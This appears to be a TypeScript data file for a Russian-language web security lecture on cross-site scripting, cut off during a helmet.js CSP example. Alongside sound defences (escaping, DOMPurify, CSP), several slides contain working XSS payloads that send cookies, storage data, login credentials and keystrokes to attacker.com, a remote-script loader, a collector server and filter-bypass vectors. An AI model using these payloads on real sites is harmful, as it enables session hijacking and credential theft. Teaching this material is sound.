import { Lecture } from "@/types";

export const xssVulnerabilitiesLecture: Lecture = {
  id: "xss-vulnerabilities-lecture",
  title: "Cross-Site Scripting (XSS)",
  description:
    "Подробное изучение XSS уязвимостей: типы, механизмы эксплуатации, методы обнаружения и защиты",
  groupId: "web-security",
  createdAt: new Date("2025-09-27"),
  updatedAt: new Date("2025-09-27"),
  tags: ["web-security", "XSS", "OWASP", "веб-разработка", "безопасность"],
  difficulty: "intermediate",
  duration: 3.5,

  slides: [
    {
      id: "slide-1",
      title: "Cross-Site Scripting (XSS)",
      type: "title",
      content:
        "Типы, механизмы эксплуатации и методы защиты от XSS уязвимостей",
      keyPoints: [
        {
          title: "Типы XSS атак",
          description: "Reflected, Stored, DOM-based и другие виды XSS",
        },
        {
          title: "Механизмы эксплуатации",
          description: "Как злоумышленники используют XSS уязвимости",
        },
        {
          title: "Методы защиты",
          description: "Content Security Policy, экранирование и валидация",
        },
        {
          title: "Практические примеры",
          description: "Реальные сценарии атак и защиты",
        },
      ],
    },

    {
      id: "slide-2",
      title: "Что такое XSS?",
      type: "content",
      content:
        "Cross-Site Scripting (XSS) — это тип уязвимости веб-приложений, который позволяет злоумышленникам внедрять вредоносный JavaScript код в веб-страницы, просматриваемые другими пользователями. XSS является одной из самых распространенных уязвимостей веб-приложений и занимает третье место в OWASP Top 10 2021.",
    },

    {
      id: "slide-3",
      title: "Почему XSS опасен?",
      type: "list",
      content: "XSS позволяет злоумышленникам выполнять множество атак:",
      items: [
        "Кража cookies и session токенов пользователей",
        "Перехват нажатий клавиш (keylogging)",
        "Фишинг через поддельные формы входа",
        "Распространение вредоносного ПО",
        "Изменение содержимого страницы для пользователей",
        "Выполнение действий от имени жертвы",
        "Получение конфиденциальной информации",
      ],
    },

    {
      id: "slide-4",
      title: "Статистика XSS",
      type: "two-column",
      content: "XSS остается одной из самых распространенных уязвимостей",
      leftContent: {
        title: "Распространенность",
        items: [
          "~40% веб-приложений уязвимы к XSS",
          "Входит в OWASP Top 10 с 2003 года",
          "Обнаруживается в крупных компаниях",
          "Часто встречается в legacy системах",
        ],
      },
      rightContent: {
        title: "Последствия",
        items: [
          "Компрометация аккаунтов пользователей",
          "Утечка конфиденциальных данных",
          "Репутационный ущерб",
          "Нарушение законодательства (GDPR)",
        ],
      },
    },

    {
      id: "slide-5",
      title: "Типы XSS уязвимостей",
      type: "title",
      content: "Три основных типа Cross-Site Scripting атак",
      keyPoints: [
        {
          title: "Reflected XSS",
          description: "Отраженные атаки через параметры запроса",
        },
        {
          title: "Stored XSS",
          description: "Хранимые атаки через базу данных",
        },
        {
          title: "DOM-based XSS",
          description: "Атаки через манипуляцию DOM на клиенте",
        },
      ],
    },

    {
      id: "slide-6",
      title: "Reflected XSS",
      type: "content",
      content:
        "Reflected (отраженный) XSS — это самый распространенный тип XSS атак. Вредоносный скрипт передается через параметры HTTP запроса и немедленно отражается в ответе сервера. Атака происходит в контексте одного HTTP запроса-ответа и не сохраняется на сервере. Злоумышленник обычно отправляет жертве специально созданную ссылку с вредоносным payload.",
    },

    {
      id: "slide-7",
      title: "Механизм Reflected XSS",
      type: "list",
      content: "Как работает отраженная XSS атака:",
      items: [
        "Злоумышленник создает вредоносную ссылку с JavaScript кодом",
        "Жертва переходит по ссылке (через фишинг, социальную инженерию)",
        "Сервер получает запрос и включает параметр в HTML ответ",
        "Браузер жертвы выполняет вредоносный JavaScript",
        "Скрипт получает доступ к cookies, может выполнять действия от имени пользователя",
        "Данные отправляются злоумышленнику",
      ],
    },

    {
      id: "slide-8",
      title: "Пример Reflected XSS",
      type: "code",
      content: "Уязвимый код поискового функционала:",
      codeExample: {
        language: "php",
        title: "Vulnerable Search Page",
        code: `<?php
// Уязвимый код - НЕ ИСПОЛЬЗОВАТЬ
$search = $_GET['q'];
?>

<!DOCTYPE html>
<html>
<body>
  <h1>Результаты поиска</h1>
  <p>Вы искали: <?php echo $search; ?></p>
  
  <!-- Результаты поиска -->
</body>
</html>

<!-- 
Вредоносная ссылка:
http://example.com/search.php?q=<script>
  fetch('http://attacker.com/steal?cookie=' + document.cookie)
</script>

Когда жертва переходит по ссылке, её cookies отправляются злоумышленнику
-->`,
      },
    },

    {
      id: "slide-9",
      title: "Stored XSS",
      type: "content",
      content:
        "Stored (хранимый) XSS — наиболее опасный тип XSS атак. Вредоносный скрипт сохраняется на сервере (в базе данных, файлах, логах) и затем отображается всем пользователям, которые просматривают зараженную страницу. В отличие от Reflected XSS, атака происходит постоянно и не требует специальной ссылки — достаточно просто посетить страницу.",
    },

    {
      id: "slide-10",
      title: "Механизм Stored XSS",
      type: "list",
      content: "Как работает хранимая XSS атака:",
      items: [
        "Злоумышленник находит форму ввода (комментарий, профиль, форум)",
        "Вводит вредоносный JavaScript код вместо обычного текста",
        "Приложение сохраняет данные в базе без проверки",
        "Каждый пользователь, просматривающий страницу, загружает вредоносный скрипт",
        "Скрипт выполняется в браузере каждой жертвы автоматически",
        "Может затронуть тысячи пользователей",
      ],
    },

    {
      id: "slide-11",
      title: "Пример Stored XSS",
      type: "code",
      content: "Уязвимая система комментариев:",
      codeExample: {
        language: "javascript",
        title: "Vulnerable Comment System",
        code: `// Node.js + Express - УЯЗВИМЫЙ КОД
app.post('/comment', async (req, res) => {
  const { username, comment } = req.body;
  
  // Сохранение без валидации - ОПАСНО!
  await db.query(
    'INSERT INTO comments (username, comment) VALUES (?, ?)',
    [username, comment]
  );
  
  res.redirect('/comments');
});

app.get('/comments', async (req, res) => {
  const comments = await db.query('SELECT * FROM comments');
  
  let html = '<h1>Комментарии</h1>';
  comments.forEach(c => {
    // Вывод без экранирования - ОПАСНО!
    html += \`<div>
      <strong>\${c.username}</strong>: \${c.comment}
    </div>\`;
  });
  
  res.send(html);
});

/*
Злоумышленник отправляет комментарий:
<script>
  setInterval(() => {
    fetch('http://attacker.com/log?cookie=' + document.cookie);
  }, 5000);
</script>

Теперь каждый посетитель страницы будет отправлять свои cookies 
злоумышленнику каждые 5 секунд!
*/`,
      },
    },

    {
      id: "slide-12",
      title: "DOM-based XSS",
      type: "content",
      content:
        "DOM-based XSS — уникальный тип атаки, при котором уязвимость существует в клиентском JavaScript коде, а не на сервере. Вредоносный payload никогда не отправляется на сервер, а обрабатывается полностью в браузере через манипуляцию Document Object Model (DOM). Это делает такие атаки сложнее для обнаружения традиционными средствами защиты.",
    },

    {
      id: "slide-13",
      title: "Механизм DOM-based XSS",
      type: "list",
      content: "Как работает DOM-based XSS:",
      items: [
        "Клиентский JavaScript читает данные из небезопасного источника (URL, localStorage)",
        "Данные записываются в опасный sink (innerHTML, eval, document.write)",
        "Вредоносный код выполняется без взаимодействия с сервером",
        "Payload часто находится после символа # (fragment identifier)",
        "Серверные WAF и фильтры не видят атаку",
        "Требует анализа клиентского кода для обнаружения",
      ],
    },

    {
      id: "slide-14",
      title: "Пример DOM-based XSS",
      type: "code",
      content: "Уязвимая обработка URL параметров на клиенте:",
      codeExample: {
        language: "javascript",
        title: "Vulnerable Client-Side Code",
        code: `// УЯЗВИМЫЙ КОД - НЕ ИСПОЛЬЗОВАТЬ
function displayWelcome() {
  // Чтение имени из URL
  const params = new URLSearchParams(window.location.search);
  const username = params.get('name');
  
  // Опасная запись в DOM - УЯЗВИМОСТЬ!
  document.getElementById('welcome').innerHTML = 
    'Добро пожаловать, ' + username + '!';
}

// Другой пример с location.hash
function showMessage() {
  const message = window.location.hash.substring(1);
  
  // Использование innerHTML с непроверенными данными
  document.getElementById('message').innerHTML = 
    decodeURIComponent(message);
}

/*
Вредоносные URL:
http://example.com/?name=<img src=x onerror=alert(document.cookie)>

http://example.com/#<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>

Сервер никогда не увидит эти payload, 
так как всё обрабатывается в браузере!
*/`,
      },
    },

    {
      id: "slide-15",
      title: "Источники и приемники DOM XSS",
      type: "two-column",
      content: "Опасные источники данных и приемники в JavaScript",
      leftContent: {
        title: "Источники (Sources)",
        items: [
          "document.URL",
          "document.location",
          "window.location.hash",
          "document.referrer",
          "window.name",
          "localStorage/sessionStorage",
        ],
      },
      rightContent: {
        title: "Приемники (Sinks)",
        items: [
          "innerHTML / outerHTML",
          "document.write()",
          "eval() / setTimeout() / setInterval()",
          "element.setAttribute()",
          "location / location.href",
        ],
      },
    },

    {
      id: "slide-16",
      title: "Другие типы XSS",
      type: "list",
      content: "Менее распространенные, но важные типы XSS:",
      items: [
        "Blind XSS — payload выполняется в административных панелях, логах, которые злоумышленник не видит",
        "Self XSS — требует действий самой жертвы (копирование в консоль), используется в социальной инженерии",
        "Mutation XSS (mXSS) — использует особенности парсинга HTML браузерами",
        "Universal XSS (UXSS) — эксплуатирует уязвимости самого браузера",
        "CSS-based XSS — использует CSS для выполнения JavaScript (устарело в современных браузерах)",
      ],
    },

    {
      id: "slide-17",
      title: "Blind XSS",
      type: "content",
      content:
        "Blind XSS — это особый тип Stored XSS, при котором злоумышленник не видит результат атаки напрямую. Payload сохраняется в системе и выполняется, когда администратор или другой пользователь просматривает логи, панель управления, отчеты или другие внутренние страницы. Атака может оставаться незамеченной длительное время.",
    },

    {
      id: "slide-18",
      title: "Пример Blind XSS",
      type: "code",
      content: "Payload для Blind XSS с обратной связью:",
      codeExample: {
        language: "javascript",
        title: "Blind XSS Payload",
        code: `// Payload для Blind XSS
// Отправляется через форму обратной связи, комментарий и т.д.

<script>
// Создаем объект с информацией о жертве
var data = {
  url: window.location.href,
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  userAgent: navigator.userAgent,
  timestamp: new Date().toISOString(),
  
  // Делаем скриншот страницы (если доступно)
  screenshot: null
};

// Получаем HTML страницы
data.pageHTML = document.documentElement.outerHTML.substring(0, 5000);

// Отправляем данные на сервер злоумышленника
fetch('https://attacker.com/blindxss', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});

// Можно также загрузить дополнительный payload
var s = document.createElement('script');
s.src = 'https://attacker.com/advanced-payload.js';
document.body.appendChild(s);
</script>

/*
Этот payload отправляется через форму контактов:
Имя: John Doe
Email: john@example.com  
Сообщение: <script>...</script>

Когда администратор открывает тикет в админ-панели,
скрипт выполняется и отправляет информацию злоумышленнику
*/`,
      },
    },

    {
      id: "slide-19",
      title: "Векторы XSS атак",
      type: "title",
      content: "Различные способы доставки XSS payload",
      keyPoints: [
        {
          title: "HTML контексты",
          description: "Теги, атрибуты, комментарии",
        },
        {
          title: "JavaScript контексты",
          description: "Inline скрипты, обработчики событий",
        },
        {
          title: "Обход фильтров",
          description: "Техники уклонения от защиты",
        },
      ],
    },

    {
      id: "slide-20",
      title: "XSS через HTML теги",
      type: "list",
      content: "Основные HTML теги для XSS атак:",
      items: [
        "<script>alert(1)</script> — классический вектор",
        "<img src=x onerror=alert(1)> — через обработчик ошибки",
        "<svg onload=alert(1)> — SVG элементы",
        "<iframe src=javascript:alert(1)> — через iframe",
        "<body onload=alert(1)> — через события загрузки",
        "<input onfocus=alert(1) autofocus> — автофокус",
        "<video><source onerror=alert(1)> — медиа элементы",
      ],
    },

    {
      id: "slide-21",
      title: "XSS через атрибуты",
      type: "code",
      content: "Инъекция через атрибуты HTML элементов:",
      codeExample: {
        language: "html",
        title: "XSS via HTML Attributes",
        code: `<!-- Пример уязвимого кода -->
<input type="text" value="USER_INPUT">

<!-- XSS payload разрывает атрибут -->
<input type="text" value="" onfocus="alert(1)" autofocus="">

<!-- ----------------------------- -->

<!-- Уязвимая ссылка -->
<a href="USER_INPUT">Click</a>

<!-- XSS через javascript: протокол -->
<a href="javascript:alert(1)">Click</a>

<!-- ----------------------------- -->

<!-- Уязвимый стиль -->
<div style="USER_INPUT">content</div>

<!-- XSS через CSS expression (IE) -->
<div style="background:url('javascript:alert(1)')">content</div>

<!-- Современные браузеры: -->
<div style="color:red;}" onload="alert(1)//">content</div>

<!-- ----------------------------- -->

<!-- XSS через data атрибуты -->
<div data-value="USER_INPUT"></div>
<script>
  // Код читает data-value и вставляет в innerHTML
  document.querySelector('div').innerHTML = 
    document.querySelector('div').dataset.value;
</script>

<!-- Payload: -->
<div data-value="<img src=x onerror=alert(1)>"></div>`,
      },
    },

    {
      id: "slide-22",
      title: "XSS в JavaScript контексте",
      type: "code",
      content: "Инъекция когда пользовательский ввод попадает в JavaScript:",
      codeExample: {
        language: "javascript",
        title: "XSS in JavaScript Context",
        code: `// УЯЗВИМЫЙ КОД
<script>
  var username = "USER_INPUT";
  console.log("Hello, " + username);
</script>

// Payload для выхода из строки:
"; alert(1); //

// Результат:
<script>
  var username = ""; alert(1); //";
  console.log("Hello, " + username);
</script>

// ========================================

// Уязвимый JSON
<script>
  var user = USER_JSON_INPUT;
</script>

// Payload:
{"name": "test", "exploit": "</script><script>alert(1)</script><script>"}

// ========================================

// Уязвимый обработчик событий
<button onclick="search('USER_INPUT')">Search</button>

// Payload разрывает функцию:
'); alert(1); //

// Результат:
<button onclick="search(''); alert(1); //')">Search</button>

// ========================================

// Template literals (ES6)
<script>
  const message = \`Hello, USER_INPUT\`;
</script>

// Payload:
\${alert(1)}

// Результат выполнит alert внутри template literal`,
      },
    },

    {
      id: "slide-23",
      title: "Обход фильтров XSS",
      type: "content",
      content:
        "Многие веб-приложения пытаются защититься от XSS с помощью фильтров, которые блокируют определенные ключевые слова или паттерны. Однако существует множество техник обхода таких фильтров, включая использование различных кодировок, альтернативных тегов, обфускации и эксплуатации особенностей парсинга HTML браузерами.",
    },

    {
      id: "slide-24",
      title: "Техники обхода фильтров",
      type: "list",
      content: "Распространенные методы обхода XSS фильтров:",
      items: [
        "Изменение регистра: <ScRiPt>, <SCRIPT>, <sCrIpT>",
        "Кодирование: %3Cscript%3E, &#60;script&#62;, \\u003cscript\\u003e",
        "Разрыв тегов: <scr<script>ipt>, <sc\\0ript>",
        "Null bytes: <script\\0>alert(1)</script>",
        "Использование альтернативных тегов: <svg>, <math>, <marquee>",
        "Обход через атрибуты: onclick, onerror, onload вместо <script>",
        "Полиморфные payload: генерация разных вариантов одной атаки",
      ],
    },

    {
      id: "slide-25",
      title: "Примеры обхода фильтров",
      type: "code",
      content: "Продвинутые техники обхода защиты:",
      codeExample: {
        language: "html",
        title: "Filter Bypass Techniques",
        code: `<!-- Если фильтруется слово "script" -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>alert(1)</script>  <!-- После удаления одного <script> -->

<!-- Использование HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">  <!-- alert -->

<!-- Обход через JavaScript кодирование -->
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">

<!-- Обход с использованием новых строк и табуляции -->
<img src=x
onerror
=
"alert(1)"
>

<!-- Использование событий без кавычек -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert\`1\`>  <!-- Template literals -->

<!-- Обфускация через математические операции -->
<img src=x onerror=alert(1*1)>
<img src=x onerror=alert(2-1)>

<!-- Обход WAF через payload fragmentation -->
<svg/onload=alert(1)>
<svg//////onload=alert(1)>
<svg id=x onload=alert(1)>

<!-- Polyglot payload (работает в разных контекстах) -->
jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e`,
      },
    },

    {
      id: "slide-26",
      title: "XSS Polyglots",
      type: "content",
      content:
        "XSS Polyglot — это специально созданный payload, который работает в различных контекстах одновременно: в HTML, атрибутах, JavaScript, CSS и т.д. Такие payload сложны в создании, но очень эффективны для тестирования, так как могут сработать в неожиданных местах. Polyglots часто используются в автоматизированных инструментах сканирования.",
    },

    {
      id: "slide-27",
      title: "Практика эксплуатации XSS",
      type: "title",
      content: "Реальные сценарии использования XSS уязвимостей",
      keyPoints: [
        {
          title: "Кража сессий",
          description: "Получение cookies и токенов аутентификации",
        },
        {
          title: "Фишинг",
          description: "Создание поддельных форм входа",
        },
        {
          title: "Keylogging",
          description: "Перехват вводимых данных",
        },
        {
          title: "Дефейс",
          description: "Изменение содержимого страницы",
        },
      ],
    },

    {
      id: "slide-28",
      title: "Кража cookies через XSS",
      type: "code",
      content: "Самый распространенный вектор эксплуатации XSS:",
      codeExample: {
        language: "javascript",
        title: "Cookie Stealing via XSS",
        code: `// Простая кража cookies
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>

// Более скрытный вариант через Image
<script>
  new Image().src = 'https://attacker.com/log?c=' + 
    encodeURIComponent(document.cookie);
</script>

// Кража с отправкой дополнительной информации
<script>
(function() {
  var data = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    userAgent: navigator.userAgent,
    timestamp: Date.now()
  };
  
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
  });
})();
</script>

// Сервер злоумышленника (Node.js)
app.post('/collect', (req, res) => {
  const stolen = req.body;
  
  // Сохраняем украденные данные
  fs.appendFileSync('stolen.log', 
    JSON.stringify(stolen) + '\\n'
  );
  
  // Возвращаем 200 чтобы не вызывать подозрений
  res.sendStatus(200);
});

/*
ВАЖНО: HttpOnly cookies не могут быть украдены через document.cookie
Но могут быть использованы для выполнения действий от имени пользователя
*/`,
      },
    },

    {
      id: "slide-29",
      title: "Фишинг через XSS",
      type: "code",
      content: "Создание поддельной формы входа на легитимном сайте:",
      codeExample: {
        language: "javascript",
        title: "Phishing via XSS",
        code: `// XSS Payload создает поддельную форму входа
<script>
// Скрываем настоящее содержимое страницы
document.body.innerHTML = '';

// Создаем поддельную форму входа
const phishingHTML = \`
  <div style="
    max-width: 400px; 
    margin: 100px auto; 
    padding: 40px; 
    border: 1px solid #ccc;
    border-radius: 8px;
    font-family: Arial, sans-serif;
  ">
    <h2>Сессия истекла</h2>
    <p>Пожалуйста, войдите снова для продолжения</p>
    
    <form id="phishing-form" style="margin-top: 20px;">
      <input type="email" id="email" placeholder="Email" 
        style="width: 100%; padding: 10px; margin-bottom: 10px;" required>
      <input type="password" id="password" placeholder="Пароль" 
        style="width: 100%; padding: 10px; margin-bottom: 20px;" required>
      <button type="submit" style="
        width: 100%; 
        padding: 10px; 
        background: #007bff; 
        color: white; 
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 16px;
      ">Войти</button>
    </form>
  </div>
\`;

document.body.innerHTML = phishingHTML;

// Перехватываем отправку формы
document.getElementById('phishing-form').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  
  // Отправляем данные злоумышленнику
  fetch('https://attacker.com/phish', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
    headers: {'Content-Type': 'application/json'}
  }).then(() => {
    // Перенаправляем на настоящую страницу входа
    window.location = '/login?expired=true';
  });
});
</script>

/*
Жертва видит форму входа на легитимном домене,
не подозревая, что это фишинг. После ввода данных
она перенаправляется на настоящую страницу входа.
*/`,
      },
    },

    {
      id: "slide-30",
      title: "Keylogging через XSS",
      type: "code",
      content: "Перехват всех нажатий клавиш на странице:",
      codeExample: {
        language: "javascript",
        title: "Keylogging Attack",
        code: `// Keylogger через XSS
<script>
// Буфер для накопления нажатий
let keyBuffer = '';
let lastSend = Date.now();

document.addEventListener('keypress', function(e) {
  // Добавляем символ в буфер
  keyBuffer += e.key;
  
  // Отправляем данные каждые 10 нажатий или каждые 5 секунд
  if (keyBuffer.length >= 10 || Date.now() - lastSend > 5000) {
    sendKeys();
  }
});

function sendKeys() {
  if (keyBuffer.length === 0) return;
  
  fetch('https://attacker.com/keylog', {
    method: 'POST',
    body: JSON.stringify({
      keys: keyBuffer,
      url: window.location.href,
      timestamp: Date.now()
    }),
    headers: {'Content-Type': 'application/json'}
  });
  
  keyBuffer = '';
  lastSend = Date.now();
}

// Также перехватываем значения из форм при отправке
document.addEventListener('submit', function(e) {
  const formData = new FormData(e.target);
  const data = {};
  
  for (let [key, value] of formData.entries()) {
    data[key] = value;
  }
  
  fetch('https://attacker.com/formdata', {
    method: 'POST',
    body: JSON.stringify(data),
    headers: {'Content-Type': 'application/json'}
  });
});

// Отправляем буфер при закрытии страницы
window.addEventListener('beforeunload', function() {
  if (keyBuffer.length > 0) {
    // Используем sendBeacon для гарантированной отправки
    navigator.sendBeacon(
      'https://attacker.com/keylog',
      JSON.stringify({keys: keyBuffer})
    );
  }
});
</script>`,
      },
    },

    {
      id: "slide-31",
      title: "Методы защиты от XSS",
      type: "title",
      content: "Комплексный подход к предотвращению XSS атак",
      keyPoints: [
        {
          title: "Экранирование вывода",
          description: "Правильное кодирование данных для разных контекстов",
        },
        {
          title: "Валидация ввода",
          description: "Проверка и очистка пользовательских данных",
        },
        {
          title: "Content Security Policy",
          description: "Современный механизм защиты на уровне браузера",
        },
        {
          title: "Безопасные API",
          description: "Использование безопасных методов работы с DOM",
        },
      ],
    },

    {
      id: "slide-32",
      title: "Экранирование вывода",
      type: "content",
      content:
        "Экранирование (escaping) — это процесс преобразования специальных символов в их безопасные HTML-эквиваленты. Это основной и наиболее важный метод защиты от XSS. Критически важно понимать, что экранирование должно быть контекстно-зависимым: разные контексты (HTML, атрибуты, JavaScript, CSS, URL) требуют разных методов экранирования.",
    },

    {
      id: "slide-33",
      title: "Экранирование в разных контекстах",
      type: "code",
      content: "Правильное экранирование для различных контекстов:",
      codeExample: {
        language: "javascript",
        title: "Context-Aware Escaping",
        code: `// 1. HTML контекст - экранирование специальных символов
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return text.replace(/[&<>"'/]/g, char => map[char]);
}

// Использование:
const username = '<script>alert(1)</script>';
const safe = escapeHtml(username);
// Результат: &lt;script&gt;alert(1)&lt;/script&gt;

// 2. JavaScript контекст - экранирование для строк
function escapeJavaScript(text) {
  return text
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t')
    .replace(/\f/g, '\\f')
    .replace(/</g, '\\u003c')
    .replace(/>/g, '\\u003e');
}

// 3. URL контекст - кодирование для URL
function escapeUrl(text) {
  return encodeURIComponent(text);
}

// 4. CSS контекст - экранирование для CSS
function escapeCss(text) {
  return text.replace(/[^a-zA-Z0-9]/g, char => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}

// Пример использования в шаблоне
function renderUserProfile(user) {
  return \`
    <div class="profile">
      <!-- HTML контекст -->
      <h1>\${escapeHtml(user.name)}</h1>
      
      <!-- Атрибут контекст -->
      <img src="/avatar/\${escapeUrl(user.id)}" 
           alt="\${escapeHtml(user.name)}">
      
      <!-- JavaScript контекст -->
      <button onclick="showProfile('\${escapeJavaScript(user.name)}')">
        View Profile
      </button>
      
      <!-- CSS контекст (избегайте если возможно!) -->
      <style>
        .user-\${escapeCss(user.id)} { color: red; }
      </style>
    </div>
  \`;
}`,
      },
    },

    {
      id: "slide-34",
      title: "Использование безопасных API",
      type: "code",
      content: "Предпочитайте безопасные методы работы с DOM:",
      codeExample: {
        language: "javascript",
        title: "Safe DOM APIs",
        code: `// ОПАСНО - не используйте innerHTML с пользовательскими данными
element.innerHTML = userInput; // ❌

// БЕЗОПАСНО - используйте textContent для текста
element.textContent = userInput; // ✅

// БЕЗОПАСНО - используйте setAttribute для атрибутов
element.setAttribute('title', userInput); // ✅

// БЕЗОПАСНО - создавайте элементы программно
const div = document.createElement('div');
div.textContent = userInput;
element.appendChild(div); // ✅

// =====================================

// Для создания элементов из HTML используйте DOMParser
function createSafeElement(htmlString) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(htmlString, 'text/html');
  
  // Удаляем все скрипты и обработчики событий
  const scripts = doc.querySelectorAll('script');
  scripts.forEach(script => script.remove());
  
  // Удаляем опасные атрибуты
  const elements = doc.querySelectorAll('*');
  elements.forEach(el => {
    // Удаляем все on* атрибуты
    Array.from(el.attributes).forEach(attr => {
      if (attr.name.startsWith('on')) {
        el.removeAttribute(attr.name);
      }
    });
    
    // Проверяем href и src на javascript:
    if (el.hasAttribute('href')) {
      const href = el.getAttribute('href');
      if (href.toLowerCase().startsWith('javascript:')) {
        el.removeAttribute('href');
      }
    }
  });
  
  return doc.body.firstChild;
}

// Использование:
const safeElement = createSafeElement(userHTML);
container.appendChild(safeElement);`,
      },
    },

    {
      id: "slide-35",
      title: "Валидация и санитизация",
      type: "content",
      content:
        "Валидация проверяет, соответствуют ли данные ожидаемому формату (белый список), а санитизация удаляет или экранирует потенциально опасный контент (черный список). Валидация более надежна, но не всегда возможна. Санитизация сложна и подвержена ошибкам. Комбинация обоих подходов обеспечивает лучшую защиту.",
    },

    {
      id: "slide-36",
      title: "Библиотеки для санитизации",
      type: "code",
      content: "Использование проверенных библиотек для очистки HTML:",
      codeExample: {
        language: "javascript",
        title: "DOMPurify - HTML Sanitization",
        code: `// DOMPurify - самая популярная библиотека санитизации
// npm install dompurify

import DOMPurify from 'dompurify';

// Базовая санитизация
const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
console.log(clean); // <img src="x">

// Строгая санитизация - только текст
const cleanText = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: [],
  ALLOWED_ATTR: []
});

// Разрешить только определенные теги
const cleanLimited = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
  ALLOWED_ATTR: ['href']
});

// Санитизация с проверкой ссылок
const cleanWithLinks = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['a', 'p', 'br'],
  ALLOWED_ATTR: ['href', 'target'],
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):|[^a-z]|[a-z+.-]+(?:[^a-z+.\-:]|$))/i
});

// Добавление хуков для дополнительной обработки
DOMPurify.addHook('afterSanitizeAttributes', function(node) {
  // Добавляем rel="noopener" ко всем ссылкам
  if (node.tagName === 'A') {
    node.setAttribute('rel', 'noopener noreferrer');
    node.setAttribute('target', '_blank');
  }
});

const result = DOMPurify.sanitize(userInput);

// Пример безопасного рендеринга комментариев
function renderComment(comment) {
  const sanitized = DOMPurify.sanitize(comment.text, {
    ALLOWED_TAGS: ['p', 'br', 'b', 'i', 'em', 'strong', 'a'],
    ALLOWED_ATTR: ['href']
  });
  
  return \`
    <div class="comment">
      <div class="author">\${escapeHtml(comment.author)}</div>
      <div class="text">\${sanitized}</div>
    </div>
  \`;
}`,
      },
    },

    {
      id: "slide-37",
      title: "Content Security Policy (CSP)",
      type: "content",
      content:
        "Content Security Policy — это мощный механизм защиты, работающий на уровне браузера. CSP позволяет определить, какие источники контента (скрипты, стили, изображения) могут быть загружены и выполнены на странице. Даже если злоумышленнику удастся внедрить XSS payload, браузер заблокирует его выполнение благодаря CSP.",
    },

    {
      id: "slide-38",
      title: "Директивы CSP",
      type: "list",
      content: "Основные директивы Content Security Policy:",
      items: [
        "default-src — источник по умолчанию для всех типов контента",
        "script-src — откуда могут загружаться и выполняться скрипты",
        "style-src — источники для CSS стилей",
        "img-src — источники для изображений",
        "connect-src — куда можно отправлять запросы (fetch, XHR, WebSocket)",
        "font-src — источники для шрифтов",
        "frame-src — источники для iframe",
        "upgrade-insecure-requests — автоматическое обновление HTTP до HTTPS",
      ],
    },

    {
      id: "slide-39",
      title: "Настройка CSP",
      type: "code",
      content: "Примеры конфигурации Content Security Policy:",
      codeExample: {
        language: "javascript",
        title: "CSP Configuration Examples",
        code: `// 1. Строгая политика - только собственный контент
// HTTP заголовок:
Content-Security-Policy: default-src 'self'

// Или через meta тег:
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'">

// =====================================

// 2. Разрешение определенных источников
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net;
  style-src 'self' https://fonts.googleapis.com;
  font-src https://fonts.gstatic.com;
  img-src 'self' data: https:;

// =====================================

// 3. Использование nonce для inline скриптов
// Сервер генерирует случайный nonce
const nonce = crypto.randomBytes(16).toString('base64');

// Заголовок:
Content-Security-Policy: script-src 'self' 'nonce-\${nonce}'

// HTML:
<script nonce="\${nonce}">
  console.log('Этот скрипт разрешен');
</script>

// =====================================

// 4. Строгая CSP для современных приложений
Content-Security-Policy:
  default-src 'none';
  script-src 'self' 'strict-dynamic' 'nonce-\${nonce}';
  style-src 'self';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;

// =====================================

// 5. Режим отчетов (Report-Only) для тестирования
Content-Security-Policy-Report-Only:
  default-src 'self';
  report-uri /csp-violation-report;

// Обработка отчетов о нарушениях
app.post('/csp-violation-report', (req, res) => {
  const violation = req.body;
  console.log('CSP Violation:', violation);
  
  // Логирование в систему мониторинга
  logger.warn('CSP Violation', {
    documentUri: violation['document-uri'],
    violatedDirective: violation['violated-directive'],
    blockedUri: violation['blocked-uri'],
    sourceFile: violation['source-file'],
    lineNumber: violation['line-number']
  });
  
  res.sendStatus(204);
});`,
      },
    },

    {
      id: "slide-40",
      title: "CSP в Node.js приложениях",
      type: "code",
      content: "Настройка CSP с использованием helmet.js:",
      codeExample: {
        language: "javascript",
        title: "CSP with Helmet.js",
        code: `const express = require('express');
const helmet = require('helmet');
const crypto = require('crypto');

const app = express();

// Генерация nonce для каждого запроса
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

// Настройка CSP через helmet
app.use(
  helmet.contentSecurityPolicy({
    directives: {
